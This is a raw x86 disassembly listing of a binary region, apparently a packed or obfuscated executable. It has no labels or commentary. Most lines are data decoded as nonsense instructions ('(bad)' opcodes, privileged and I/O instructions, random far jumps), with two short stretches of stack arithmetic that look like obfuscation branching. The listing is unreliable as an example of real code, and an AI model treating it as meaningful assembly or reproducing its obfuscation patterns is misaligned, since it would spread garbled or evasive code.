  41b9eb:	push   0x6dd64aa5
  41b9f0:	rcr    DWORD PTR [ebx-0x47],1
  41b9f3:	or     DWORD PTR [ebp+eax*8-0x68],ebp
  41b9f7:	jno    0x41ba77
  41b9f9:	jge    0x41ba0e
  41b9fb:	xchg   ebx,eax
  41b9fc:	mov    edx,0x33f950fb
  41ba01:	ds jge 0x41b9d1
  41ba04:	rcr    DWORD PTR [edi],0x1d
  41ba07:	push   es
  41ba08:	hlt    
  41ba09:	(bad)  
  41ba0a:	fsubr  DWORD PTR [esi+eax*2-0x62dae02d]
  41ba11:	out    0x58,al
  41ba13:	mov    al,ds:0x271b3c04
  41ba18:	pop    ebx
  41ba19:	xor    BYTE PTR [edi+edx*4+0x38],0xf0
  41ba1e:	adc    eax,0x38a98238
  41ba23:	lea    ebx,[ebx+0x70a5d94]
  41ba29:	jmp    0xc2b9:0x2e24d87f
  41ba30:	bound  edi,QWORD PTR [ebx+0x1f44d2e0]
  41ba36:	xchg   DWORD PTR [ebx],ebp
  41ba38:	jle    0x41ba5d
  41ba3a:	mov    ah,0xed
  41ba3c:	(bad)  
  41ba3d:	call   0xf9488f6b
  41ba42:	sbb    al,0x78
  41ba44:	push   cs
  41ba45:	cwde   
  41ba46:	sbb    al,0x70
  41ba48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba49:	add    al,0x91
  41ba4b:	push   ebp
  41ba4c:	sar    dh,0x46
  41ba4f:	sub    al,0x91
  41ba51:	jmp    0x41ba86
  41ba53:	and    ch,bl
  41ba55:	cmp    edx,DWORD PTR [esi+0x62]
  41ba58:	je     0x41ba9c
  41ba5a:	inc    edi
  41ba5b:	std    
  41ba5c:	jne    0x41ba17
  41ba5e:	adc    esp,DWORD PTR [eax]
  41ba60:	popf   
  41ba61:	mov    eax,ds:0x816e55b2
  41ba66:	imul   edx,DWORD PTR [eax],0x8e9deff2
  41ba6c:	repnz int3 
  41ba6e:	push   ds
  41ba6f:	es push esp
  41ba71:	sub    al,0xa0
  41ba73:	push   ss
  41ba74:	inc    di
  41ba76:	(bad)  
  41ba77:	stos   DWORD PTR es:[edi],eax
  41ba78:	mov    ebx,DWORD PTR [ecx+0x66]
  41ba7b:	pop    ebx
  41ba7c:	jb     0x41ba91
  41ba7e:	push   ds
  41ba7f:	mov    edi,0x1f09faf4
  41ba84:	or     BYTE PTR [ecx],cl
  41ba86:	jg     0x41ba92
  41ba88:	popa   
  41ba89:	bound  eax,QWORD PTR [ecx]
  41ba8b:	dec    dh
  41ba8d:	dec    esi
  41ba8e:	inc    eax
  41ba8f:	jecxz  0x41ba70
  41ba91:	inc    ecx
  41ba92:	test   BYTE PTR [esi],dl
  41ba94:	jne    0x41ba9e
  41ba96:	in     al,dx
  41ba97:	iret   
  41ba98:	mov    ebx,0x96843f72
  41ba9d:	and    eax,0xb4c245ab
  41baa2:	mov    bl,0xc0
  41baa4:	fldcw  WORD PTR [edx+0x17b5ea94]
  41baaa:	sbb    ch,BYTE PTR [ecx-0x6f]
  41baad:	fimul  DWORD PTR [edx-0x28cd964e]
  41bab3:	hlt    
  41bab4:	es jbe 0x41bb34
  41bab7:	jg     0x41bac7
  41bab9:	retf   0x4a7f
  41babc:	xchg   ebp,eax
  41babd:	cmp    DWORD PTR [ebp-0xb],0xfa37f91a
  41bac4:	aam    0xa0
  41bac6:	nop
  41bac7:	mov    ch,0x1f
  41bac9:	sbb    DWORD PTR [ecx-0x6a193ff0],0x8b8784eb
  41bad3:	sti    
  41bad4:	bound  ebp,QWORD PTR [ecx]
  41bad6:	clc    
  41bad7:	xor    BYTE PTR [ebx],bl
  41bad9:	push   edx
  41bada:	dec    edi
  41badb:	push   edi
  41badc:	scas   eax,DWORD PTR es:[edi]
  41badd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bade:	les    ebp,FWORD PTR [edi+0x573f3d79]
  41bae4:	inc    DWORD PTR [edx+0x4f]
  41bae7:	mov    esi,0x51067878
  41baec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baed:	retf   
  41baee:	mov    ecx,0x3b1fefcb
  41baf3:	adc    eax,0xf05ef7bc
  41baf8:	lds    edi,FWORD PTR [esi]
  41bafa:	jne    0x41ba90
  41bafc:	mov    WORD PTR [ebp+0x52efbd32],gs
  41bb02:	xchg   ebp,eax
  41bb03:	and    eax,0xa4552d38
  41bb08:	and    ecx,edx
  41bb0a:	daa    
  41bb0b:	int3   
  41bb0c:	mov    al,ds:0x4b63070a
  41bb11:	(bad)  
  41bb12:	dec    ecx
  41bb13:	out    dx,eax
  41bb14:	mov    ecx,0x85c28c7
  41bb19:	mov    esp,0x196056eb
  41bb1e:	pop    eax
  41bb1f:	xor    DWORD PTR [edx-0x30],esi
  41bb22:	outs   dx,DWORD PTR ds:[esi]
  41bb23:	xor    al,0xd3
  41bb25:	jmp    0x226c:0x1eadd894
  41bb2c:	adc    al,0x44
  41bb2e:	mov    ss,WORD PTR [esi-0x2c]
  41bb31:	push   0x59
  41bb33:	rol    DWORD PTR [esi-0x25],0x94
  41bb37:	lahf   
  41bb38:	and    BYTE PTR [esi+0x51],0x6c
  41bb3c:	cdq    
  41bb3d:	loopne 0x41bb9d
  41bb3f:	pop    ss
  41bb40:	imul   esp,edi,0xffffffbb
  41bb43:	shl    al,0xf1
  41bb46:	xchg   ebp,eax
  41bb47:	inc    ecx
  41bb48:	je     0x41bb68
  41bb4a:	jbe    0x41bb92
  41bb4c:	mov    bl,0x8a
  41bb4e:	adc    eax,ecx
  41bb50:	enter  0xbfd4,0x86
  41bb54:	fisubr WORD PTR [esi-0x6d]
  41bb57:	mov    fs,WORD PTR [ebx]
  41bb59:	test   DWORD PTR [eax+ebx*8-0x41458b6e],edi
  41bb60:	lahf   
  41bb61:	inc    esp
  41bb62:	gs retf 
  41bb64:	sbb    DWORD PTR [di+0x6041],ebp
  41bb69:	xchg   edx,eax
  41bb6a:	wrmsr  
  41bb6c:	or     ebx,DWORD PTR [edx+0x47680970]
  41bb72:	cwde   
  41bb73:	in     eax,0x1e
  41bb75:	lock data16 mov ch,0x76
  41bb79:	cdq    
  41bb7a:	adc    esi,DWORD PTR [ebx]
  41bb7c:	rol    BYTE PTR [ebx],1
  41bb7e:	xchg   BYTE PTR [ebx+eiz*2],bh
  41bb81:	jb     0x41bb68
  41bb83:	and    dl,al
  41bb85:	push   ebx
  41bb86:	stos   DWORD PTR es:[edi],eax
  41bb87:	jno    0x41bb86
  41bb89:	mov    dl,0x6b
  41bb8b:	fdivr  QWORD PTR [edx-0x6853d866]
  41bb91:	lock mov esi,0x2477437f
  41bb97:	pop    eax
  41bb98:	fdivp  st(0),st
  41bb9a:	jns    0x41bc15
  41bb9c:	(bad)  
  41bb9d:	mov    bh,0x45
  41bb9f:	and    DWORD PTR [edx-0x5c],ebp
  41bba2:	(bad)  
  41bba3:	icebp  
  41bba4:	jne    0x41bbb4
  41bba6:	mov    ch,BYTE PTR [edx-0xa]
  41bba9:	adc    BYTE PTR [ecx+0x5cff6371],ah
  41bbaf:	sbb    dl,bh
  41bbb1:	mov    eax,ds:0xc971bba6
  41bbb6:	and    al,0x4d
  41bbb8:	cmp    edx,esi
  41bbba:	loopne 0x41bb7e
  41bbbc:	sahf   
  41bbbd:	xor    eax,0x9ba83bb8
  41bbc2:	cmp    ah,ch
  41bbc4:	inc    esi
  41bbc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbc6:	sub    ebx,esi
  41bbc8:	enter  0x7ff7,0xb4
  41bbcc:	retf   0x505c
  41bbcf:	mov    eax,DWORD PTR [ebp-0x35dc9998]
  41bbd5:	mov    dx,WORD PTR [esp+0x24]
  41bbda:	or     cx,dx
  41bbdd:	mov    dx,WORD PTR [esp+0x2c]
  41bbe2:	add    cx,dx
  41bbe5:	or     ecx,0x3b22
  41bbeb:	mov    WORD PTR [esp+0x3c],cx
  41bbf0:	jmp    0x41bfbf
  41bbf5:	inc    edx
  41bbf6:	pop    edx
  41bbf7:	push   ecx
  41bbf8:	fwait
  41bbf9:	xor    DWORD PTR [edx+0x237b5a22],ebx
  41bbff:	pop    ecx
  41bc00:	stos   BYTE PTR es:[edi],al
  41bc01:	push   edx
  41bc02:	jmp    0x41bbc1
  41bc04:	mov    al,0x3
  41bc06:	adc    DWORD PTR [esi],0x1812bc18
  41bc0c:	sbb    cl,bl
  41bc0e:	xchg   esi,eax
  41bc0f:	pushf  
  41bc10:	xor    DWORD PTR [edi+0x43d57da9],ebp
  41bc16:	mov    ebp,0x5de7a332
  41bc1b:	cli    
  41bc1c:	loopne 0x41bc28
  41bc1e:	and    al,dh
  41bc20:	dec    ecx
  41bc21:	inc    ebx
  41bc22:	in     eax,dx
  41bc23:	sub    DWORD PTR [edx],ebp
  41bc25:	sbb    DWORD PTR [eax],edx
  41bc27:	xchg   esi,eax
  41bc28:	inc    esi
  41bc29:	xor    al,0xcd
  41bc2b:	inc    ebx
  41bc2c:	and    DWORD PTR [eax-0x53],esi
  41bc2f:	xor    DWORD PTR [esi-0x2c943a53],0xb9cd3ea1
  41bc39:	and    eax,0x353dc93c
  41bc3e:	xchg   edi,eax
  41bc3f:	push   ecx
  41bc40:	push   ebp
  41bc41:	push   es
  41bc42:	dec    edi
  41bc43:	mov    cl,dh
  41bc45:	inc    ecx
  41bc46:	add    DWORD PTR [ecx+0x209470f1],esp
  41bc4c:	sbb    dl,BYTE PTR [eax+0x498b729a]
  41bc52:	bswap  esi
  41bc54:	jge    0x41bc09
  41bc56:	mov    dh,0x5a
  41bc58:	xor    al,0x6a
  41bc5a:	imul   edi,DWORD PTR [ecx-0x20],0x58c647ab
  41bc61:	pusha  
  41bc62:	mov    DWORD PTR [ebx],ebx
  41bc64:	ror    DWORD PTR [eax+0x39cf0090],cl
  41bc6a:	dec    eax
  41bc6b:	cmp    al,0x60
  41bc6d:	adc    esi,DWORD PTR [eax-0x32]
  41bc70:	mov    ecx,DWORD PTR [edx]
  41bc72:	push   ebx
  41bc73:	or     eax,0xdea3b3d8
  41bc78:	imul   esp,DWORD PTR [bx],0xffffffd7
  41bc7c:	dec    ebp
  41bc7d:	dec    edx
  41bc7e:	sbb    al,0xf6
  41bc81:	test   BYTE PTR [edx],0xa1
  41bc84:	push   0xe3dcfb9c
  41bc89:	leave  
  41bc8a:	adc    DWORD PTR [ecx+eiz*2+0x8],edx
  41bc8e:	loope  0x41bc47
  41bc90:	xor    al,al
  41bc92:	aam    0x81
  41bc94:	adc    ah,0x27
  41bc97:	(bad)
  41bc9a:	sub    eax,DWORD PTR [ebp-0x71c49fb6]
  41bca0:	push   edx
  41bca1:	push   eax
  41bca2:	pop    edi
  41bca3:	or     al,0x4a
  41bca5:	loopne 0x41bc63
  41bca7:	rcl    DWORD PTR [ebp+0x30],cl
  41bcaa:	mov    eax,ss
  41bcac:	daa    
  41bcad:	add    BYTE PTR [ebp-0x44d8f9db],ah
  41bcb3:	add    ebp,DWORD PTR [edi]
  41bcb5:	push   cs
  41bcb6:	jmp    0x320662e1
  41bcbb:	fcom   DWORD PTR [ebp-0x62]
  41bcbe:	inc    ecx
  41bcbf:	call   0xc86b535f
  41bcc4:	inc    eax
  41bcc5:	(bad)  
  41bcc6:	mov    bh,0x12
  41bcc8:	fist   DWORD PTR [edx-0x2fe15c26]
  41bcce:	xchg   ebx,eax
  41bccf:	sub    ecx,DWORD PTR [edx]
  41bcd1:	(bad)  
  41bcd2:	push   ss
  41bcd3:	call   0x58c5:0xc2640881
  41bcda:	fidivr DWORD PTR [esi-0x7c]
  41bcdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcde:	fst    DWORD PTR [ebx-0x6a2b3466]
  41bce4:	fisubr WORD PTR [edx+0x30228526]
  41bcea:	sbb    BYTE PTR [ebx-0xc],ah
  41bced:	ror    DWORD PTR [edx-0x79d05e44],1
  41bcf3:	xor    cl,BYTE PTR [edi+eax*2]
  41bcf6:	mov    ecx,0x1bf3c580
  41bcfb:	loopne 0x41bce3
  41bcfd:	imul   edx,ebx,0x4345e60d
  41bd03:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41bd05:	mov    edi,0xdd77d501
  41bd0a:	mov    ds:0x962f0f04,eax
  41bd0f:	loop   0x41bcc7
  41bd11:	or     BYTE PTR [edi+edx*4-0x77],ch
  41bd15:	into   
  41bd16:	and    al,0xc2
  41bd18:	push   ss
  41bd19:	je     0x41bcfa
  41bd1b:	cmp    eax,0x70fe97e9
  41bd20:	lds    ecx,FWORD PTR [edi+edi*8]
  41bd23:	mov    esi,DWORD PTR [edi]
  41bd25:	cld    
  41bd26:	adc    eax,0x81172ad0
  41bd2b:	cli    
  41bd2c:	sub    esp,DWORD PTR [eax]
  41bd2e:	xor    DWORD PTR [eax-0x78],esi
  41bd31:	push   ss
  41bd32:	sar    DWORD PTR [ebx+0x6b8e16b1],cl
  41bd38:	sbb    bl,dh
  41bd3a:	enter  0xa3cb,0xc0
  41bd3e:	pop    ecx
  41bd3f:	and    edx,ebx
  41bd41:	cmp    edi,DWORD PTR [ebp+0x1bbabebf]
  41bd47:	push   0xffffff87
  41bd49:	mov    ecx,0x6a2479e5
  41bd4e:	pop    ebp
  41bd4f:	add    al,0xeb
  41bd51:	or     eax,0x7099a0de
  41bd56:	mov    dl,0xfa
  41bd58:	pop    edx
  41bd59:	xor    eax,0x1c11254
  41bd5e:	sub    al,0x6
  41bd60:	adc    eax,0x426064f8
  41bd65:	jp     0x41bdd7
  41bd67:	das    
  41bd68:	jb     0x41bd18
  41bd6a:	fbstp  TBYTE PTR [esi+0x1f]
  41bd6d:	pop    ss
  41bd6e:	test   DWORD PTR [edi+0x7a],edi
  41bd71:	les    edi,FWORD PTR [edi-0x76]
  41bd74:	ins    BYTE PTR es:[edi],dx
  41bd75:	fstp   st(7)
  41bd77:	je     0x41bddd
  41bd79:	sub    esp,DWORD PTR [ebx]
  41bd7b:	push   ebp
  41bd7c:	or     DWORD PTR [eax-0xf54bad4],ecx
  41bd82:	xor    BYTE PTR [ebp-0x5],0x22
  41bd86:	inc    edi
  41bd87:	push   esp
  41bd88:	int    0x1f
  41bd8a:	add    cl,BYTE PTR [esi-0x7f]
  41bd8d:	icebp  
  41bd8e:	aaa    
  41bd8f:	aam    0x12
  41bd91:	sahf   
  41bd92:	xchg   edx,eax
  41bd93:	jp     0x41bd9d
  41bd95:	and    dh,cl
  41bd97:	outs   dx,DWORD PTR ds:[esi]
  41bd98:	mov    esp,0xcc47f76d
  41bd9d:	or     esp,DWORD PTR [edx+0x30092c10]
  41bda3:	cli    
  41bda4:	ror    BYTE PTR [esi+0x37],1
  41bda7:	les    edi,FWORD PTR [ebx+0x258401c4]
  41bdad:	xchg   ecx,eax
  41bdae:	cs push ebx
  41bdb0:	and    ebp,ecx
  41bdb2:	adc    eax,0x5d06cef4
  41bdb7:	ror    ebx,cl
  41bdb9:	adc    DWORD PTR [ecx],ebp
  41bdbb:	lds    esi,FWORD PTR [ecx]
  41bdbd:	icebp  
  41bdbe:	sbb    eax,0x7800b1db
  41bdc3:	inc    edx
  41bdc4:	outs   dx,BYTE PTR ds:[esi]
  41bdc5:	call   0x535da8b3
  41bdca:	cmp    DWORD PTR [eax+0x2e],esi
  41bdcd:	jecxz  0x41bdfe
  41bdcf:	outs   dx,BYTE PTR ds:[esi]
  41bdd0:	xor    BYTE PTR [ecx],0xdc
  41bdd3:	int    0xb8
  41bdd5:	arpl   bx,cx
  41bdd7:	push   ss
  41bdd8:	push   esp
  41bdd9:	or     eax,0x5290b0ae
  41bdde:	adc    esp,DWORD PTR [ebp-0x276953ef]
  41bde4:	hlt    
  41bde5:	test   BYTE PTR [ebx-0x23],dh
  41bde8:	jmp    0xb8a2:0x6987a9f2
  41bdef:	jne    0x41be04
  41bdf1:	ds gs push eax
  41bdf4:	out    0xed,al
  41bdf6:	fistp  WORD PTR ds:0x7ea88353
  41bdfc:	jns    0x41be25
  41bdfe:	or     eax,0x2140454c
  41be03:	jne    0x41bdcf
  41be05:	jmp    0xbb18:0xbbcdb9de
  41be0c:	or     ax,0xa458
  41be10:	dec    edi
  41be11:	pop    ss
  41be12:	and    al,0xa
  41be14:	push   ds
  41be15:	adc    al,0x53
  41be17:	ret    0xc7a
  41be1a:	(bad)  
  41be1b:	icebp  
  41be1c:	adc    bl,al
  41be1e:	popa   
  41be1f:	and    DWORD PTR [esi+0x30767580],0xfffffff5
  41be26:	dec    ebp
  41be27:	xor    BYTE PTR [ebx],0xf5
  41be2a:	jmp    0xf272:0x5770522a
  41be31:	dec    edi
  41be32:	adc    esp,DWORD PTR [edx+0x72e99696]
  41be38:	push   es
  41be39:	mov    eax,ds:0x747aa9c9
  41be3e:	sub    al,0x5
  41be40:	or     DWORD PTR fs:[eax+ecx*4],ecx
  41be44:	out    dx,eax
  41be45:	sbb    ecx,DWORD PTR [ecx+0x7e756f3d]
  41be4b:	xchg   ebp,eax
  41be4c:	xchg   ebp,eax
  41be4d:	jmp    0xe3e9ec63
  41be52:	leave  
  41be53:	inc    esp
  41be54:	pop    ebx
  41be55:	xor    eax,0xe3142b41
  41be5a:	sar    BYTE PTR [edi+0x1b8d4ec8],1
  41be60:	mov    edx,0x4ac7e0cc
  41be65:	xchg   esp,eax
  41be66:	push   edx
  41be67:	cmp    ebp,DWORD PTR [ebp-0x1fc729fd]
  41be6d:	jb     0x41be1d
  41be6f:	pop    ebp
  41be70:	sub    eax,DWORD PTR [edx+0x3f61f31e]
  41be76:	inc    esp
  41be77:	mov    ecx,0x171ff1ad
  41be7c:	lea    esi,[edx+0x60f6b8]
  41be82:	push   ds
  41be83:	retf   0x8e6f
  41be86:	aaa    
  41be87:	fist   DWORD PTR [ecx+0x6a]
  41be8a:	cmp    BYTE PTR [ecx-0x55],dh
  41be8d:	rol    BYTE PTR [ecx],1
  41be8f:	fldenv [ebx]
  41be91:	mov    al,0x7
  41be93:	push   cs
  41be94:	inc    edi
  41be95:	mov    bl,0x2b
  41be97:	out    0x7e,al
  41be99:	lds    edi,FWORD PTR [edx-0x66]
  41be9c:	add    al,0xe8
  41be9e:	sbb    ecx,DWORD PTR [edx+0xdb8dc67]
  41bea4:	push   ss
  41bea5:	inc    edx
  41bea6:	jmp    0x7b5b:0x92535869
  41bead:	lahf   
  41beae:	mov    cl,0x3e
  41beb0:	or     al,0xc6
  41beb2:	cld    
  41beb3:	mov    ebp,0xa022d49c
  41beb8:	and    DWORD PTR [eax-0x18],edx
  41bebb:	aad    0xb5
  41bebd:	sub    al,0x14
  41bebf:	jo     0x41bf1e
  41bec1:	js     0x41be99
  41bec3:	pop    ebx
  41bec4:	stos   DWORD PTR es:[edi],eax
  41bec5:	stos   BYTE PTR es:[edi],al
  41bec6:	ret    0x9c72
  41bec9:	inc    ecx
  41beca:	adc    edi,esp
  41becc:	jb     0x41bf35
  41bece:	sub    esp,eax
  41bed0:	sub    BYTE PTR [ebx],0xe1
  41bed3:	mov    esi,ds
  41bed5:	aam    0x6d
  41bed7:	inc    esp
  41bed8:	mov    ecx,0xe2fd7167
  41bedd:	lahf   
  41bede:	adc    DWORD PTR [eax-0x5d86773a],edx
  41bee4:	or     dl,dl
  41bee6:	sub    ecx,esp
  41bee8:	loopne 0x41becd
  41beea:	cmp    DWORD PTR [edi-0x75fd40a5],eax
  41bef0:	and    ebx,DWORD PTR [edx+0x1e0bb986]
  41bef6:	les    esi,FWORD PTR [edx]
  41bef8:	adc    eax,0xb1a5d77
  41befd:	pop    ecx
  41befe:	fisub  DWORD PTR [edi+ebp*8]
  41bf01:	pop    ds
  41bf02:	sub    DWORD PTR ds:0xa41e4aa9,0xf01184d0
  41bf0c:	dec    edi
  41bf0d:	scas   eax,DWORD PTR es:[edi]
  41bf0e:	mov    eax,0x30355065
  41bf13:	in     eax,dx
  41bf14:	add    DWORD PTR [ebx-0x7b],edi
  41bf17:	cmp    DWORD PTR [esi+ecx*8-0x39],ecx
  41bf1b:	scas   eax,DWORD PTR es:[edi]
  41bf1c:	(bad)  
  41bf1d:	gs sbb al,0xc7
  41bf20:	mov    bh,0x15
  41bf22:	jo     0x41bf2b
  41bf24:	sbb    eax,0xfe264198
  41bf29:	stos   DWORD PTR es:[edi],eax
  41bf2a:	(bad)  
  41bf2b:	mov    ecx,DWORD PTR [edi]
  41bf2d:	ss push esi
  41bf2f:	sahf   
  41bf30:	cmp    BYTE PTR [eax+0xe93c655],bl
  41bf36:	out    0xd4,al
  41bf38:	sub    ebx,0xffffff97
  41bf3b:	xchg   edx,eax
  41bf3c:	ret    0xc1fa
  41bf3f:	dec    esi
  41bf40:	sub    DWORD PTR [eax+0x781fd086],ebp
  41bf46:	dec    esp
  41bf47:	and    al,0x87
  41bf49:	jmp    0x1f27ab96
  41bf4e:	inc    esi
  41bf4f:	mov    edx,DWORD PTR [edi+0x29250010]
  41bf55:	ins    DWORD PTR es:[edi],dx
  41bf56:	leave  
  41bf57:	ja     0x41bf1a
  41bf59:	pop    es
  41bf5a:	sub    al,0x47
  41bf5c:	mov    eax,0x37ec2e62
  41bf61:	ret    0x987e
  41bf64:	sbb    BYTE PTR [edi],0xf3
  41bf67:	idiv   BYTE PTR [ebx+0x3d]
  41bf6a:	cmp    eax,0x2c285ff
  41bf6f:	cmp    edi,DWORD PTR [edx-0x12402d33]
  41bf75:	adc    al,0xdc
  41bf77:	mov    dl,0x4d
  41bf79:	fldenv [ebx+0xe]
  41bf7c:	dec    ebx
  41bf7d:	add    BYTE PTR [ebp+esi*1+0x58],ah
  41bf81:	lods   eax,DWORD PTR ds:[esi]
  41bf82:	and    al,0xaf
  41bf84:	jmp    0x41bf81
  41bf86:	jnp    0x41bfee
  41bf88:	pop    ebx
  41bf89:	imul   esp,DWORD PTR [ebp+0x27c820fc],0x5026780d
  41bf93:	adc    dh,0x50
  41bf96:	push   edi
  41bf97:	imul   eax,DWORD PTR [ebp+edx*4-0x28],0xfb899464
  41bf9f:	and    eax,0x296bbdd7
  41bfa4:	push   ebp
  41bfa5:	lods   eax,DWORD PTR ds:[esi]
  41bfa6:	sub    esp,DWORD PTR [ebp-0x788c8b08]
  41bfac:	cmp    DWORD PTR [edi],ebp
  41bfae:	add    dh,0x70
  41bfb1:	loop   0x41bfd7
  41bfb3:	or     esp,DWORD PTR [ebx+0x3665ce84]
  41bfb9:	mov    esi,0x35aa5609
  41bfbe:	mov    WORD PTR [ecx+0x57d4],?
  41bfc4:	mov    WORD PTR [esp+0x2c],cx
  41bfc9:	mov    ecx,0x3b21
  41bfce:	mov    WORD PTR [esp+0x38],cx
  41bfd3:	mov    ecx,0x52fd
  41bfd8:	mov    WORD PTR [esp+0x24],cx
  41bfdd:	mov    ecx,0x2ce0
  41bfe2:	mov    WORD PTR [esp+0xc],cx
  41bfe7:	mov    cx,WORD PTR [esp+0xc]
  41bfec:	mov    dx,WORD PTR [esp+0x24]
  41bff1:	or     cx,dx
  41bff4:	mov    edx,0x21a4
  41bff9:	or     cx,dx
  41bffc:	mov    dx,WORD PTR [esp+0x2c]
  41c001:	sub    cx,dx
  41c004:	mov    dx,WORD PTR [esp+0x38]
  41c009:	sub    cx,dx
  41c00c:	mov    dx,WORD PTR [esp+0x3c]
  41c011:	cmp    dx,cx
  41c014:	jbe    0x41c888
  41c01a:	mov    ecx,0x5008
  41c01f:	mov    WORD PTR [esp+0x24],cx
  41c024:	mov    ecx,0x60ce
  41c029:	mov    WORD PTR [esp+0xc],cx
  41c02e:	movzx  ecx,WORD PTR [esp+0xc]
  41c033:	mov    edx,0x2095
  41c038:	or     cx,dx
  41c03b:	mov    dx,WORD PTR [esp+0x24]
  41c040:	sub    cx,dx
  41c043:	mov    edx,0x10de
  41c048:	or     ecx,0x742f
  41c04e:	imul   ecx,ecx,0x30b2
  41c054:	mov    WORD PTR [esp+0x3c],cx
  41c059:	mov    ecx,0x6143
  41c05e:	mov    WORD PTR [esp+0x38],cx
  41c063:	mov    ecx,0x679f
  41c068:	mov    WORD PTR [esp+0x2c],cx
  41c06d:	mov    ecx,0x1210
  41c072:	mov    WORD PTR [esp+0x24],cx
  41c077:	mov    ecx,0x3308
  41c07c:	mov    WORD PTR [esp+0xc],cx
  41c081:	mov    cx,WORD PTR [esp+0xc]
  41c086:	sub    cx,dx
  41c089:	mov    dx,WORD PTR [esp+0x24]
  41c08e:	xor    cx,dx
  41c091:	mov    dx,WORD PTR [esp+0x2c]
  41c096:	imul   cx,dx
  41c09a:	mov    dx,WORD PTR [esp+0x38]
  41c09f:	and    cx,dx
  41c0a2:	mov    edx,0x694c
  41c0a7:	and    cx,dx
  41c0aa:	mov    dx,WORD PTR [esp+0x3c]
  41c0af:	cmp    dx,cx
  41c0b2:	ja     0x41c888
  41c0b8:	mov    ecx,DWORD PTR [esp+0x18]
  41c0bc:	mov    edx,DWORD PTR [esp+0x1c]
  41c0c0:	shrd   ecx,edx,0x2
  41c0c4:	xor    ecx,eax
  41c0c6:	mov    eax,DWORD PTR [esp+0x18]
  41c0ca:	shr    edx,0x2
  41c0cd:	mov    edx,DWORD PTR [esp+0x1c]
  41c0d1:	xor    edx,edx
  41c0d3:	or     edx,ecx
  41c0d5:	push   edx
  41c0d6:	push   esi
  41c0d7:	shl    eax,0x1e
  41c0da:	push   edi
  41c0db:	lea    eax,[esp+0x7c]
  41c0df:	push   eax
  41c0e0:	lea    eax,[esp+0x28]
  41c0e4:	push   eax
  41c0e5:	jmp    0x41c4b4
  41c0ea:	in     eax,0x66
  41c0ec:	sar    BYTE PTR [ebx],1
  41c0ee:	dec    edx
  41c0ef:	sbb    esp,DWORD PTR [edx+0x1e]
  41c0f2:	icebp  
  41c0f3:	scas   eax,DWORD PTR es:[edi]
  41c0f4:	mov    ch,0x7c
  41c0f6:	ffree  st(3)
  41c0f8:	adc    al,0xaa
  41c0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0fb:	jns    0x41c113
  41c0fd:	sbb    BYTE PTR [edx+edx*1-0x4a8fe7e8],bh
  41c104:	cld    
  41c105:	sub    DWORD PTR [edi],esp
  41c107:	shl    BYTE PTR [ebp+0x626c2df8],1
  41c10d:	xchg   edx,eax
  41c10e:	inc    ebx
  41c10f:	scas   eax,DWORD PTR es:[edi]
  41c110:	lods   al,BYTE PTR ds:[esi]
  41c111:	fimul  DWORD PTR [eax+ebx*8-0xe]
  41c115:	inc    ebp
  41c116:	outs   dx,DWORD PTR ds:[esi]
  41c117:	mov    DWORD PTR [ecx+0x2952b6ad],eax
  41c11d:	scas   eax,DWORD PTR es:[edi]
  41c11e:	int3   
  41c11f:	add    eax,0xb959e4a0
  41c124:	jnp    0x41c178
  41c126:	iret   
  41c127:	sub    cl,cl
  41c129:	cmp    DWORD PTR [ebx-0x1d895f48],edx
  41c12f:	dec    DWORD PTR [esp+eax*1]
  41c132:	repnz pop edx
  41c134:	add    ebx,ecx
  41c136:	cld    
  41c137:	dec    eax
  41c138:	daa    
  41c139:	cmp    BYTE PTR [edx],dh
  41c13b:	rcl    BYTE PTR [ecx+edi*8],cl
  41c13e:	dec    ecx
  41c13f:	pop    esp
  41c140:	sbb    eax,0x9bdc5329
  41c145:	mov    ah,BYTE PTR ds:0x3da3bc09
  41c14b:	stos   DWORD PTR es:[edi],eax
  41c14c:	cmp    esi,DWORD PTR [ecx+esi*2]
  41c14f:	scas   al,BYTE PTR es:[edi]
  41c150:	cmp    BYTE PTR ss:[ebx-0x12],ch
  41c154:	mov    cr5,ebp
  41c157:	jne    0x41c0ff
  41c159:	sub    DWORD PTR [ebp-0x58],eax
  41c15c:	jecxz  0x41c133
  41c15e:	sbb    eax,0x5e787d45
  41c163:	xchg   edx,eax
  41c164:	call   0xeb8b:0xc53679cc
  41c16b:	inc    esp
  41c16c:	xor    DWORD PTR [ebp-0x1888a90f],ecx
  41c172:	vmwrite esp,DWORD PTR [ebx]
  41c175:	out    0x5a,eax
  41c177:	fbstp  TBYTE PTR [esp+edx*1]
  41c17a:	fxch   st(3)
  41c17c:	push   es
  41c17d:	dec    edx
  41c17e:	xchg   esp,eax
  41c17f:	push   ebp
  41c180:	jbe    0x41c184
  41c182:	xchg   esp,eax
  41c183:	ins    BYTE PTR es:[edi],dx
  41c184:	(bad)  [eax-0x2b]
  41c187:	popa   
  41c188:	jg     0x41c1e1
  41c18a:	mov    ebx,DWORD PTR [edi+0x7ed2ab6c]
  41c190:	fwait
  41c191:	pop    ebp
  41c192:	adc    esi,DWORD PTR [edx+0x2c850ccb]
  41c198:	cmp    ecx,DWORD PTR [esi+0x49d31436]
  41c19e:	pop    ecx
  41c19f:	pop    ss
  41c1a0:	aad    0xff
  41c1a2:	call   0x57dc6807
  41c1a7:	inc    ebp
  41c1a8:	push   ds
  41c1a9:	pop    esi
  41c1aa:	rol    DWORD PTR [esi+0x25],cl
  41c1ad:	push   eax
  41c1ae:	addr16 mov dl,0x38
  41c1b1:	pop    eax
  41c1b2:	sbb    esi,DWORD PTR [esi+0x5f]
  41c1b5:	and    ch,BYTE PTR [ebx*8-0x71642372]
  41c1bc:	fimul  DWORD PTR [edi+0x58b7f107]
  41c1c2:	shr    BYTE PTR [edx+0x15],0xfe
  41c1c6:	mov    al,ds:0xb93ad646
  41c1cb:	ja     0x41c167
  41c1cd:	sub    bh,bh
  41c1cf:	jae    0x41c184
  41c1d1:	pop    esp
  41c1d2:	loopne 0x41c179
  41c1d4:	imul   eax,DWORD PTR [esi-0x5e],0xded82b06
  41c1db:	add    ah,0xa1
  41c1de:	inc    DWORD PTR [eax+0x7]
  41c1e1:	ja     0x41c20d
  41c1e3:	xbegin 0x287df949
  41c1e9:	xlat   BYTE PTR ds:[ebx]
  41c1ea:	cli    
  41c1eb:	dec    edx
